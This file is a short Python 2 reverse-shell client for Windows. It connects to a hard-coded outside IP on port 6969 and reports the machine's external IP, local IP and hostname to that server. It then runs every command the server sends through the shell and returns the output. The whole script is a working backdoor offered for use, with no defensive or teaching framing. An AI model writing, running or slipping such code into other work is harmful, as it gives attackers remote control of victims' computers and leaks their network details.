import socket
import subprocess
import os
import urllib

HOST = '98.232.32.152' # IP of server
PORT = 6969 #choose a port. must be same on client and server

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

ips = subprocess.check_output('ipconfig | find "IPv4"', shell=True)
newips = ips.split('\n')
newnewips = newips[0].split()

s.send(('You are connected to '+str(urllib.urlopen('http://ipecho.net/plain').read())+'(external)\n'+str(newnewips[len(newnewips)-1])+'(Computer IP)\n'+str(subprocess.check_output('hostname', shell=True))))


while True:
	data = s.recv(512)
	if data == "quit\n":
		s.close()
		sys.exit(0)
	elif str(data)[0:2] == 'cd':
		try:
			os.chdir(str(data)[3:].strip())
			s.send(subprocess.check_output('dir | find "Directory of "', shell=True))
		except WindowsError:
		 s.send('Not a Directory')
	else:
		try:
			s.send(subprocess.check_output(data, shell=True))
		except subprocess.CalledProcessError:
			s.send('Not command. Try Again.')
		
		



